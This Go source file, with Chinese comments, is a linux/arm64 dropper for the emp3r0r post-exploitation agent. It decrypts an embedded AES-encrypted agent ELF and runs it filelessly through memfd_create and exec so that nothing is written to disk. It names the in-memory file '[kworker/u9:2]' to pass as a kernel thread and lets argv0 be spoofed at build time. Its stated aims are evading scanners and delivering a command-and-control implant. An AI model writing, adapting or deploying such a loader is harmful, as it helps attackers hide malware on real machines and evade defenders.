package main

// linux/arm64 免杀投放器：内嵌加密的完整 emp3r0r agent ELF，运行时
// memfd_create + fexecve 内存执行——磁盘零落盘，/proc/<pid>/exe 显示为
// memfd:<name> (deleted)，不产生可被静态扫描的文件。
//
// 与 server/evasion.go 的 buildEvasionLoader（windows/amd64 专用）同构，
// 平台换成 linux/arm64；零第三方依赖（纯标准库 syscall），离线可编。
//
// 已知边界（emp3r0r agent 固有行为，不在本 loader 职责内）：agent 起来后
// 仍会自拷贝到 $HOME/.emp3r0r 并以模板名运行；本 loader 负责的是投放面。

import (
	_ "embed"
	"bytes"
	"compress/zlib"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha256"
	"errors"
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

//go:embed payload.enc
var payloadEnc []byte // nonce(16B) || sha256(comp)[:16] || AES-256-CTR(zlib(agentELF))

// payloadKey 由 pack.py 生成到 key.go：var payloadKey = []byte{...}

// memfd 名决定 /proc/<pid>/exe 的显示尾段；argv0 决定 ps 的 cmdline 首段。
// 编译期可覆盖：-ldflags "-X main.memfdName=... -X main.argv0=..."。
var (
	memfdName = "[kworker/u9:2]"
	argv0     = ""
)

// arm64 SYS_memfd_create = 279（asm-generic unistd，无 glibc 封装需求）。
const sysMemfdCreate = 279

func memfdCreate(name string) (int, error) {
	nameBuf, err := syscall.BytePtrFromString(name)
	if err != nil {
		return -1, err
	}
	// flags=0：不设 MFD_CLOEXEC——exec 后 fd 必须存活，
	// /proc/self/fd/<fd> 才能继续指向 agent 镜像（agent 自读/自拷贝用）。
	r0, _, errno := syscall.Syscall(sysMemfdCreate, uintptr(unsafe.Pointer(nameBuf)), 0, 0)
	if errno != 0 {
		return -1, errno
	}
	return int(r0), nil
}

func main() {
	if len(payloadEnc) < 13+16 {
		fatal("内嵌载荷损坏")
	}
	plain, err := decrypt(payloadEnc, payloadKey)
	if err != nil {
		fatal("解密失败: %v", err)
	}

	fd, err := memfdCreate(memfdName)
	if err != nil {
		fatal("memfd_create: %v", err)
	}
	for off := 0; off < len(plain); {
		n, werr := syscall.Write(fd, plain[off:])
		if werr != nil || n <= 0 {
			fatal("写入 memfd 失败: %v", werr)
		}
		off += n
	}
	if _, err := syscall.Seek(fd, 0, 0); err != nil {
		fatal("seek: %v", err)
	}

	exePath := fmt.Sprintf("/proc/self/fd/%d", fd)
	a0 := argv0
	if a0 == "" {
		a0 = exePath
	}
	argv := []string{a0}
	argv = append(argv, os.Args[1:]...)
	if err := syscall.Exec(exePath, argv, os.Environ()); err != nil {
		fatal("exec: %v", err)
	}
}

// decrypt nonce(16) || tag(16) || ct：AES-256-CTR 解出
// tag(sha256(comp)[:16]) || zlib 体，校验后解压得 agent ELF。
// openssl enc 不支持 GCM，认证用明文哈希前缀（pack.py 同序）。
func decrypt(blob, key []byte) ([]byte, error) {
	const nonceLen, tagLen = 16, 16
	if len(blob) < nonceLen+tagLen {
		return nil, errors.New("载荷过短")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	stream := cipher.NewCTR(block, blob[:nonceLen])
	plain := make([]byte, len(blob)-nonceLen)
	stream.XORKeyStream(plain, blob[nonceLen:])
	tag, comp := plain[:tagLen], plain[tagLen:]
	if sum := sha256.Sum256(comp); !bytes.Equal(sum[:tagLen], tag) {
		return nil, errors.New("完整性校验失败（key 或载荷不匹配）")
	}
	zr, err := zlib.NewReader(bytes.NewReader(comp))
	if err != nil {
		return nil, fmt.Errorf("zlib: %w", err)
	}
	defer zr.Close()
	var out bytes.Buffer
	if _, err := out.ReadFrom(zr); err != nil {
		return nil, fmt.Errorf("解压: %w", err)
	}
	return out.Bytes(), nil
}

func fatal(f string, a ...any) {
	fmt.Fprintf(os.Stderr, "loader: "+f+"\n", a...)
	os.Exit(1)
}
